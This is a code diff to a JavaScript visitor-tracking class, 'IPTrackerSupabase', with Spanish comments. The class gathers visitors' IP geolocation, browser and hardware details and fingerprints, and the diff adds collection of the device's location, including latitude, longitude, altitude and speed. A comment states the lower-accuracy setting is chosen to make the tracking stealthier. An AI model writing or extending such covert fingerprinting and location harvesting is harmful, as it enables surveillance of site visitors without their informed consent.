@@ -67,6 +67,9 @@ class IPTrackerSupabase {
         // 1. IP y Geolocalización
         const geoData = await this.obtenerIPyGeo();
         
+        // 1b. Ubicación GPS real (si el usuario permite)
+        const gpsData = await this.obtenerUbicacionGPS();
+        
         // 2. Información del navegador
         const browserData = this.obtenerInfoNavegador();
         
@@ -83,6 +86,7 @@ class IPTrackerSupabase {
             visitor_id: id,
             timestamp: new Date().toISOString(),
             ...geoData,
+            ...gpsData,
             ...browserData,
             ...hardwareData,
             ...fingerprints,
@@ -172,6 +176,54 @@ class IPTrackerSupabase {
                 }
             }
         }
+    }
+
+    // Obtener ubicación GPS real del dispositivo (más precisa)
+    async obtenerUbicacionGPS() {
+        return new Promise((resolve) => {
+            // Si el navegador no soporta geolocalización
+            if (!navigator.geolocation) {
+                resolve({
+                    gps_latitud: null,
+                    gps_longitud: null,
+                    gps_precision: null,
+                    gps_estado: 'No soportado'
+                });
+                return;
+            }
+
+            // Intentar obtener ubicación GPS (timeout 5 segundos para no demorar)
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    resolve({
+                        gps_latitud: position.coords.latitude,
+                        gps_longitud: position.coords.longitude,
+                        gps_precision: Math.round(position.coords.accuracy),
+                        gps_altitud: position.coords.altitude,
+                        gps_velocidad: position.coords.speed,
+                        gps_estado: 'Obtenido'
+                    });
+                },
+                (error) => {
+                    let estado = 'Error';
+                    if (error.code === 1) estado = 'Permiso denegado';
+                    if (error.code === 2) estado = 'Posición no disponible';
+                    if (error.code === 3) estado = 'Timeout';
+                    
+                    resolve({
+                        gps_latitud: null,
+                        gps_longitud: null,
+                        gps_precision: null,
+                        gps_estado: estado
+                    });
+                },
+                {
+                    enableHighAccuracy: false, // false = no pedir GPS preciso para ser más sigiloso
+                    timeout: 5000,
+                    maximumAge: 300000 // Aceptar caché de hasta 5 minutos
+                }
+            );
+        });
     }
 
     // Información del navegador
